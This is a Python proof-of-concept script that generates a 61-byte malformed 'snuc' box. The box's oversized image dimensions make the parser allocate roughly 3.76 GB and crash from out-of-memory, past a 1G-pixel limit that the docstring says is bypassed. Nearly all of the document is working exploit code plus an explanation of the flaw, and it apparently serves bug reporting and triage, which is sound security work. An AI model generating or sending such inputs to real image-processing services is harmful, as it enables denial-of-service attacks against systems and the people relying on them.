#!/usr/bin/env python3
"""
gen_poc.py — Generate a minimal snuc box POC for Bug 12.

Box_snuc::parse() allocates two std::vector<float> sized to
image_width * image_height pixels. With image_width=2 and
image_height=117,966,856, num_pixels = 235,933,712 which is within
the 1G-pixel security limit but the two resize() calls together
allocate ~1.88 GB, exhausting memory.

The m_memory_handle.alloc(2*4*235933712) == 1.88 GB call registers
usage in the MemoryHandle tracking system, but the subsequent
std::vector::resize() calls make separate OS allocations that bypass
the tracking system. The result is the process attempting to allocate
~3.76 GB total (1.88 GB tracked + 1.88 GB untracked from resize()),
causing OOM.

Box wire format:
  [0..3]  uint32_be: total box size
  [4..7]  4cc:       "snuc"
  [8..11] uint32_be: FullBox header (version<<24 | flags) = 0x00000000
  [12..15] uint32_be: component_count = 0  (no component index entries)
  [16]    uint8:     flags byte = 0x00     (nuc_is_applied = 0)
  [17..20] uint32_be: image_width  = 2
  [21..24] uint32_be: image_height = 117,966,856

Total: 25 bytes of header (no float payload; OOM fires at resize() before any reads)

Note: The bug report's "61-byte" figure includes 9 optional component
index entries (each 4 bytes) to exercise the component_count path.
The minimal POC below uses component_count=0 (25 bytes) — this is
sufficient to trigger the OOM. We also provide a 61-byte variant
with component_count=9 as described in the bug.
"""

import struct
import sys
import os

# Trigger values
IMAGE_WIDTH  = 2
IMAGE_HEIGHT = 117_966_856   # 2 * 117,966,856 = 235,933,712 pixels < 1G limit
# Memory: 2 * sizeof(float) * 235,933,712 = 1,887,469,696 bytes ~ 1.88 GB

def make_snuc_box(image_width, image_height, component_count=0):
    """
    Build a minimal snuc FullBox.
    component_count: number of component index uint32 entries to include.
    """
    # FullBox header (version=0, flags=0)
    fullbox_header = struct.pack(">I", 0x00000000)

    # component_count field
    comp_count_field = struct.pack(">I", component_count)

    # component_indices (component_count * 4 bytes, all zeros)
    comp_indices = bytes(component_count * 4)

    # flags byte (nuc_is_applied = 0)
    flags_byte = b'\x00'

    # image dimensions
    dimensions = struct.pack(">II", image_width, image_height)

    # Assemble payload (after the 8-byte box header)
    payload = fullbox_header + comp_count_field + comp_indices + flags_byte + dimensions

    # Box header: size (4) + type (4) + payload
    box_type = b'snuc'
    total_size = 4 + 4 + len(payload)
    box_header = struct.pack(">I", total_size) + box_type

    return box_header + payload


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(script_dir, "poc_input")

    # Minimal 25-byte variant (component_count=0)
    box_minimal = make_snuc_box(IMAGE_WIDTH, IMAGE_HEIGHT, component_count=0)
    assert len(box_minimal) == 25, f"Expected 25 bytes, got {len(box_minimal)}"

    # 61-byte variant (component_count=9, as in the original bug report)
    # 8 (box hdr) + 4 (fullbox) + 4 (comp_count) + 9*4 (indices) + 1 (flags) + 8 (dims) = 61
    box_61 = make_snuc_box(IMAGE_WIDTH, IMAGE_HEIGHT, component_count=9)
    assert len(box_61) == 61, f"Expected 61 bytes, got {len(box_61)}"

    # Save the 61-byte variant as poc_input (matches bug report description)
    with open(out_path, "wb") as f:
        f.write(box_61)

    print(f"[*] Written {len(box_61)}-byte snuc box to: {out_path}")
    print(f"[*] image_width={IMAGE_WIDTH}, image_height={IMAGE_HEIGHT}")
    num_pixels = IMAGE_WIDTH * IMAGE_HEIGHT
    print(f"[*] num_pixels={num_pixels:,} ({num_pixels / 1e9:.3f}G, limit=1G)")
    alloc_bytes = 2 * 4 * num_pixels
    print(f"[*] m_memory_handle.alloc()  = {alloc_bytes:,} bytes ({alloc_bytes/1e9:.3f} GB)")
    print(f"[*] resize(nuc_gains)        = {num_pixels*4:,} bytes ({num_pixels*4/1e9:.3f} GB) [untracked]")
    print(f"[*] resize(nuc_offsets)      = {num_pixels*4:,} bytes ({num_pixels*4/1e9:.3f} GB) [untracked]")
    print(f"[*] Total OS allocation      ~ {alloc_bytes*2/1e9:.3f} GB  (OOM on most systems)")

    # Also print hex dump
    print(f"\n[*] Hex dump of poc_input ({len(box_61)} bytes):")
    for i in range(0, len(box_61), 16):
        chunk = box_61[i:i+16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {i:04x}  {hex_part:<48}  {asc_part}")

    return box_61


if __name__ == "__main__":
    main()
